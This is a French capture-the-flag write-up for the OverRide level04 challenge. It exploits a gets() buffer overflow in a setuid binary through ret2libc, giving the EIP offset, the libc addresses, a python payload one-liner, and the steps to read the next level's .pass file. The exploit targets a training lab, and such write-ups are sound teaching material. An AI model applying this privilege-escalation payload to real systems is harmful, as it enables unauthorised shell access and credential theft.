## Comportement
- J'ai des droits `level04` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level05 users   7797 Sep 10  2016 level04*`
En exécutant le binaire (`./level04`), on observe:
- qu'il attend un input de notre part. Quand c'est fait il semble indiquer quitter un process enfant dans lequel nous nous trouvions.
- qu'il ne segfault pas meme si l'input est tres long. Il semble attendre. 
    ```shell
    level04@OverRide:~$ ./level04 
    Give me some shellcode, k
    test
    child is exiting...
    ```
    ```shell
    level04@OverRide:~$ ./level04 
    Give me some shellcode, k
    ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt
        # it's waiting here
    ```


## Analyse
En analysant le binaire (`gdb ./level03`) on observe:
- L'exécutable lance un processus enfant.
- Le processus principal utilise ensuite `ptrace` pour vérifier que le processus enfant n'utilise pas `execve`.
- Le processus enfant utilise `gets`, il est vulnerable.
    ```shell
    gdb> disas main
    ...
    0x0804875e <+150>:	call   0x80484b0 <gets@plt> 
    ...
    ```
- Mais puisque le programme attend clairement un shellcode, je vais plutot m'amuser a l'exploiter en utilisant un `ret2libc` (technique utilisée exécuter des fonctions déjà présentes dans la mémoire, comme celles de la bibliothèque C (libc), plutôt que d'injecter et d'exécuter du code shell arbitraire). Na !


## Résolution
- D'abord on trouve l'offset de l'`eip`:
    ```shell
    (gdb) run
    Starting program: /home/users/level04/level04 
    Give me some shellcode, k
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

    ```
- le probleme c'est que le programme ne segfault pas et qu'il attend indefiniment. Il faut donc indiquer a GDB de suivre le processus enfant ici : 
    ```shell
    (gdb) set follow-fork-mode child
    (gdb) run
    Starting program: /home/users/level04/level04 
    [New process 2059]
    Give me some shellcode, k
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

    Program received signal SIGSEGV, Segmentation fault.
    [Switching to process 2059]
    0x41326641 in ?? ()
    ```
- `0x41326641` correspond a un offset de 156 (etabli grace au [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?))
- Pour notre attaque `ret2libc` nous avons maintenant besoin de l'adresse de :
    - `system()`: `info function system` => `0xf7e6aed0`
    - `exit()`: `info function exit` => `0xf7e5eb70`
    - `"/bin/sh"`: `find __libc_start_main,+99999999,"/bin/sh"` => `0xf7f897ec`
- On craft ainsi notre payload selon ce modele : `("A" * 156) + system() + exit() + "/bin/sh"` : 
    ```shell
    python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/payload
    ```
- On lance l'attaque: 
    ```shell
    cat /tmp/payload - | ./level04 
    ```
- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `level05`.
- Il ne reste plus qu'à :
  - récupérer le password (`cat /home/users/level05/.pass`)
  - quitter le shell (`exit`)
  - et passer au level05 (`su level05`) en renseignant ce password.



  